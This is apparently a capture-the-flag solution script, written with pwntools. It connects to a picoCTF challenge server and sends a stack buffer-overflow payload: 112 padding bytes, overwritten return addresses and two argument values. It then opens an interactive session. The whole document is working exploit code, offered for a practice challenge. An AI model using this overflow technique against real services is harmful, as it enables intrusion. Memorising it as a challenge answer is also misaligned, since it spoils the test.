from pwn import *

io = remote('saturn.picoctf.net', 56709)

payload = b'a'*112
payload += p32(0x08049296)
payload += p32(0x08049372)
payload += p32(0xCAFEF00D) + p32(0xF00DF00D)
io.sendline(payload)
io.sendline(payload)
io.sendline(payload)
io.sendline(payload)
io.interactive()
